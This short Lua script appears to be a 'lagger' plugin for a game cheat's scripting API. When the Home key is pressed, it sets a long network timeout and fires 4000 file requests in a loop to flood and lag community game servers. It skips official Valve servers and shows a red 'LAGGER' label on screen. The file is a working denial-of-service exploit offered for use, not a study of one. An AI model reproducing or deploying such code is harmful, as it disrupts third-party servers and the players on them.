local function lagger()
    if client.IsValveDS() then
        return
    end
    -- VK_HOME key
    if client.IsKeyPressed(0x24) then
        netchannel.SetTimeout(3600, false)
        for i = 0, 4000, 1 do
            netchannel.RequestFile(".wav", false);
        end
    end
end

local font = surface.SetupFont("Verdana", 12, 800, 0, 0, 0x200)
local function draw_lagger()
    if client.IsValveDS() then
        return
    end
    -- VK_HOME key
    if client.IsKeyPressed(0x24) then
        surface.DrawSetTextFont(font)
        surface.DrawSetTextColor(255, 0, 0, 255)
        surface.DrawSetTextPos(5, 30)
        surface.DrawPrintText("LAGGER   ")
    end
end

client.RegisterCallback("createmovement", lagger)
client.RegisterCallback("painttraverse", draw_lagger)